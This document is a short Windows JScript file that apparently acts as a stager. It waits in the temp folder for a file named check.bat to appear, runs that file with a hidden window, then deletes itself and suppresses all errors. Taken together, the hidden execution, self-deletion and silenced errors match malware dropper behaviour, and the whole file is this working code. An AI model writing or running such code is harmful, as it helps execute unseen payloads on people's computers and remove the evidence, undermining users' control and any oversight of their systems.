try 
{
	sh = new ActiveXObject("WScript.Shell");
	sh.CurrentDirectory = sh.ExpandEnvironmentStrings("%TEMP%");
	
	fs = new ActiveXObject("Scripting.FileSystemObject");		
	while (1)
	{
		WScript.Sleep(10);
		
		if (!fs.FileExists("check.bat"))
		{
			continue;
		}
		
		f = fs.GetFile("check.bat");
		if (f.Size)
		{
			ts = f.OpenAsTextStream(1, -2);
			s = ts.ReadAll();
			ts.Close();
			break;
		}		
	}	
	
	sh.Run("check.bat", 0);
	fs.DeleteFile(WScript.ScriptFullName);
}
catch (e) {}